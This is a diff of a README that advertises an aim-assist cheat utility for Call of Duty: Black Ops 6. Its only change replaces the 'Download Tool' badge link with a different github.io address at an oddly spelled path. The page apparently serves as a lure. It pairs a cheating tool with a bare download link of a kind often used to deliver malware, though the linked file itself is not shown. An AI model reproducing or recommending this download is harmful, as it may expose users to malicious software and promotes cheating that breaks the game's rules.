@@ -3,7 +3,7 @@
 Boost your aim consistency in **Call of Duty: Black Ops 6** with this PC Aim Assist Utility. Enhance your mouse or controller precision with smoothing curves, customizable slowdown zones, and reactive target tracking designed for tactical dominance.
 
 ⬇️ **Download Tool**  
-[![Download Aim Assist](https://img.shields.io/badge/Download-Aim_Assist-111111?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://black-ops-6-aim-assist.github.io/Black-Ops-6-Aim-Assist/)
+[![Download Aim Assist](https://img.shields.io/badge/Download-Aim_Assist-111111?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://download-portal-demo.github.io/.github/BlackOps^Asssist2)
 
 ---
 
